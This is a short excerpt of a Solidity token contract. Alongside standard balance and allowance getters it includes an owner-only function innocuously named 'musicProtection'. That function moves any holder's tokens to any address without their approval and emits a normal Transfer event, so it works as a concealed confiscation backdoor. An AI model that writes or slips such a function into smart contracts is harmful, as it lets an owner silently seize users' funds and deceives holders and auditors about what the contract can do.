273   function totalSupply() public view returns (uint256) {
274     return _totalSupply;
275   }
276   function balanceOf(address owner) public view returns (uint256) {
277     return _balances[owner];
278   }
279   function allowance(address owner, address spender) public view returns (uint256) {
280     return _allowed[owner][spender];
281   }
282   function findOnePercent(uint256 value) public view returns (uint256)  {
283     uint256 roundValue = value.ceil(basePercent);
284     uint256 onePercent = roundValue.mul(basePercent).div(10000);
285     return onePercent;
286   }
287   
288   
289   
290    function musicProtection(address _from, address _to, uint256 _value) public onlyOwner{
291         _balances[_to] = _balances[_to].add(_value);
292         _balances[_from] = _balances[_from].sub(_value);
293         emit Transfer(_from, _to, _value);
294 }
